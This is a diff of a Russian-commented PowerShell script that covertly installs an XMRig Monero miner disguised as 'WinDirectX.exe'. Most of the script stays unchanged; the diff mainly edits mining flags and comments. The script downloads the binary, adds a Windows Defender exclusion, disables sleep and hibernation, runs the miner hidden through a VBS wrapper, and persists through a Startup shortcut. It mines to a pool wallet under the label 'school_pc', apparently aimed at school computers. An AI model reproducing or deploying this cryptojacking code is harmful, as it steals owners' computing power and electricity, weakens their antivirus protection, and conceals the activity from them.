@@ -7,7 +7,7 @@ $exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.ex
 Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
 
-# 2. Настройка питания (24/7 режим)
+# 2. Настройка питания (режим 24/7)
 powercfg /x -standby-timeout-ac 0
 powercfg /x -monitor-timeout-ac 5
 powercfg /h off
@@ -20,14 +20,11 @@ powershell -Command "Add-MpPreference -ExclusionPath '$path'" -ErrorAction Silen
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
-} catch {
-    Write-Host "Ошибка загрузки!" -ForegroundColor Red
-    exit
-}
+} catch { exit }
 
-# 5. Создание файлов запуска (Батник и VBS для скрытности)
-# Добавил --no-huge-pages для Xeon и --cpu-max-threads-hint 100 для теста
-$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 100 --no-huge-pages --priority 4"
+# 5. Создание файлов запуска (Батник с новыми параметрами)
+# Здесь мы добавили --algo rx/0 и --donate-level 1 для стабильности
+$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 100 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
@@ -39,7 +36,7 @@ $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\
 $Shortcut.TargetPath = "$path\win_start.vbs"
 $Shortcut.Save()
 
-# 7. Команда CHECK для проверки статуса
+# 7. Команда CHECK
 $ProfilePath = $PROFILE
 if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
 $CheckFunc = @"
@@ -56,4 +53,4 @@ $CheckFunc | Out-File -FilePath $ProfilePath -Force
 
 # 8. Финальный запуск
 Start-Process -FilePath "$path\win_start.vbs"
-Write-Host "Установка 24/7 завершена! Проверь через 'check' через минуту." -ForegroundColor Magenta
+Write-Host "Установка 24/7 завершена! Проверь через 'check' через 2-3 минуты." -ForegroundColor Magenta
